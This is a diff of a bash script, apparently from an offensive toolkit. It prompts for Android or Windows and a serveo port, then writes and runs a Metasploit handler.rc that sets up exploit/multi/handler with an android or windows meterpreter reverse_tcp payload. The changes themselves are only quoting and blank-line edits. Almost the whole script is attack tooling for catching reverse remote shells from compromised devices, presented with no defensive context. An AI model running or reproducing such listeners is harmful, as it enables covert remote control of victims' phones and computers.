@@ -8,10 +8,10 @@ printf "\e[32;5m[~] Android"
 echo ""
 printf "\e[32;5m[~] Windows"
 echo ""
-read -p 'Enter platform(1/2): ' platform
+read -p "Enter platform(1/2): " platform
 echo ""
-read -p 'Enter serveo port : ' port
-
+read -p "Enter serveo port : " port
+echo ""
 if [ $platform == 1 ]; then
 echo "use exploit/multi/handler" > handler.rc 
 echo "set payload android/meterpreter/reverse_tcp" >> handler.rc
@@ -21,7 +21,6 @@ echo "exploit" >> handler.rc
 msfconsole -r handler.rc
 rm handler.rc
 fi
-
 if [ $platform == 2 ]; then
 echo "use exploit/multi/handler" > handler.rc
 echo "set payload windows/meterpreter/reverse_tcp" >> handler.rc
